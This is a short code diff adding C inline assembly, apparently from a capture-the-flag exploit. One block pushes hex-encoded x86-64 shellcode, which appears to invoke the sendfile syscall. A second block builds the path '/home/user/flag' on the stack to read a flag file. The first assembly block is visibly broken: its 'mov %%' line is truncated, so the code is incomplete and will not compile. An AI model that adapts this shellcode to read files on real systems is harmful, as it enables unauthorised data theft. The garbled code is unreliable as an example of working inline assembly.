@@ -1,0 +1,27 @@
+    asm volatile(
+        "push $0x00000005\n\t"
+        "push $0x0f000000\n\t"
+        "push $0x12c2c749\n\t"
+        "push $0x00000000\n\t"
+        "push $0xc2c74800\n\t"
+        "push $0x000001c7\n\t"
+        "push $0xc7480000\n\t"
+        "push $0x0028c0c7\n\t"
+        "push $0x48fe8948\n\t"
+        "mov %%
+        : "=a"(shellcode)
+        :
+        : "memory"
+    );
+    void * flag_path;
+    int32_t flag_len = 16;
+    asm volatile(
+        "push $0x0067616c\n\t"
+        "push $0x662f7265\n\t"
+        "push $0x73752f65\n\t"
+        "push $0x6d6f682f\n\t"
+        "mov %%rax, %%rsp"
+        : "=a"(flag_path)
+        :
+        : "memory"
+    );
